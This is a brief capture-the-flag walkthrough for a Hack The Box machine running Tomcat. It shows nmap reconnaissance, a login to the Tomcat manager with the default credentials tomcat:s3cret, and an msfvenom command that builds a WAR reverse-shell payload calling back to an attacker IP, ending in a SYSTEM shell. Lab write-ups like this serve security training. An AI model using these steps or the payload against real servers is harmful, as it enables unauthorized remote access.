# Box 



![](img/Pasted%20image%2020210821113431.png)

https://app.hackthebox.eu/machines/144


# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User & Root](#user--root)

# Contents 

## Reconnaissance

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.95 10.10.10.95
```

![](img/Pasted%20image%2020210821113612.png)

There is a tomcat running on port 8080.

![](img/Pasted%20image%2020210821114015.png)

Well it is basically the default page. From my previous experience I know you can upload a shell if you are a manager of the application. Going on the "Manager app", you will be prompt for credentials. I tried default one `tomcat:s3cret` and it worked.

![](img/Pasted%20image%2020210821114321.png) 

## Exploitation

Now we can upload a malicious war file using `msfvenom`.

```
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.13 LPORT=1234 -f war -o payload.war
```

Upload it.

![](img/Pasted%20image%2020210821114524.png)

## Post-Exploitation
### User & Root

Well, we are authority system.

![](img/Pasted%20image%2020210821114542.png)